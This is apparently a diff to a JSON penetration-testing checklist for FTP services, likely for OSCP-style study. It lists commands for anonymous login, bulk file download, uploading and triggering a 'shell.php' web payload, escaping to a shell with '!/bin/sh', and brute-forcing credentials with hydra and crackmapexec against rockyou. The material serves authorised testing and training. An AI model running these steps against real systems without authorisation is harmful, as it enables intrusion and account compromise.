@@ -1,58 +1,82 @@
 {
   "service": "FTP",
   "port": 21,
-  "checklist": [
-    {
-      "id": "ftp_banner",
-      "title": "Banner Grabbing & Service Fingerprinting",
-      "description": "Identify software vendor, precise version, and OS hints.",
-      "commands": [
-        "nc -vn {target_ip} 21",
-        "nmap -sV -p 21 {target_ip}"
-      ]
-    },
+  "tasks": [
     {
       "id": "ftp_anon",
-      "title": "Anonymous Auth & Permissions Check",
-      "description": "Verify anonymous access (`anonymous:anonymous` or `ftp:ftp`) and test read/write privileges.",
+      "title": "Anonymous Login (CLI)",
+      "description": "Attempt to log in using Username - ANONYMOUS and Password - blank.",
       "commands": [
-        "nmap --script ftp-anon,ftp-bounce -p 21 {target_ip}",
-        "ftp {target_ip}"
+        "ftp -A {target_ip} 21"
       ]
     },
     {
-      "id": "ftp_recursion",
-      "title": "Recursive Directory & Hidden File Listing",
-      "description": "Recursively download files and check for hidden dotfiles (`.bak`, `.config`, SSH keys).",
+      "id": "ftp_browser_anon",
+      "title": "Anonymous Login (Web Browser)",
+      "description": "Navigate to the FTP service using a web browser to check for visual directory listings and easy file retrieval.",
       "commands": [
-        "wget -r --no-passive-ftp ftp://anonymous:anonymous@{target_ip}/",
-        "nmap --script ftp-syst,ftp-ls -p 21 {target_ip}"
+        "firefox ftp://anonymous:anonymous@{target_ip}/",
+        "firefox ftp://{target_ip}/"
       ]
     },
     {
-      "id": "ftp_bounce_mode",
-      "title": "Passive vs. Active Mode & Bounce Scanning",
-      "description": "Determine host firewall behavior with PASV/PORT commands and test FTP bounce support.",
+      "id": "ftp_download_all",
+      "title": "Download Directory Contents",
+      "description": "Turn the interactive prompt off and use Mget * from within the directory to download all contents.",
       "commands": [
-        "nmap -b {target_ip} 21"
+        "prompt off",
+        "mget *"
       ]
     },
     {
-      "id": "ftp_bruteforce",
-      "title": "Credential Brute-Forcing",
-      "description": "Test default passwords and spray common user lists if anonymous access is disabled.",
+      "id": "ftp_download_single",
+      "title": "Download & View Specific Files",
+      "description": "Use Get <local.txt> to download files, or !cat <local.txt> to view a file's contents directly.",
       "commands": [
-        "hydra -L /usr/share/wordlists/metasploit/namelist.txt -P /usr/share/wordlists/rockyou.txt ftp://{target_ip} -t 4",
-        "nmap --script ftp-brute -p 21 {target_ip}"
+        "get local.txt",
+        "!cat local.txt"
       ]
     },
     {
-      "id": "ftp_vuln_search",
-      "title": "Known Vulnerability Lookup",
-      "description": "Check Exploit-DB and NSE vulnerability scripts against the exact FTP server version.",
+      "id": "ftp_upload_payload",
+      "title": "Upload Payload via FTP",
+      "description": "Check write permissions. Can you upload a payload?",
       "commands": [
-        "searchsploit ftp <version>",
-        "nmap --script ftp-vuln* -p 21 {target_ip}"
+        "put shell.php",
+        "put test.txt"
+      ]
+    },
+    {
+      "id": "ftp_execute_payload",
+      "title": "Execute Uploaded Payload",
+      "description": "If upload was successful, visit the FTP site in a web browser and then activate the payload?",
+      "commands": [
+        "curl http://{target_ip}/shell.php"
+      ]
+    },
+    {
+      "id": "ftp_gtfobins",
+      "title": "GTFObins Shell Escape",
+      "description": "Once logged in try and get a shell (GTFObins). Check if the FTP service itself can be exploited to spawn an interactive shell.",
+      "commands": [
+        "ftp> !/bin/sh"
+      ]
+    },
+    {
+      "id": "ftp_hydra_spray",
+      "title": "Hydra Wordlist Spray",
+      "description": "Run hydra with your specific wordlists to brute-force credentials.",
+      "commands": [
+        "hydra -L /usr/share/wordlists/dirbuster/apache-user-enum-2.0.txt -P /usr/share/wordlists/rockyou.txt ftp://{target_ip}"
+      ]
+    },
+    {
+      "id": "ftp_cme_spray",
+      "title": "CrackMapExec Password Scan",
+      "description": "Run password scans using crackmapexec with custom wordlists.",
+      "commands": [
+        "crackmapexec ftp {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success",
+        "crackmapexec ftp {target_ip} -u users.txt -p /usr/share/wordlists/rockyou.txt"
       ]
     }
   ]
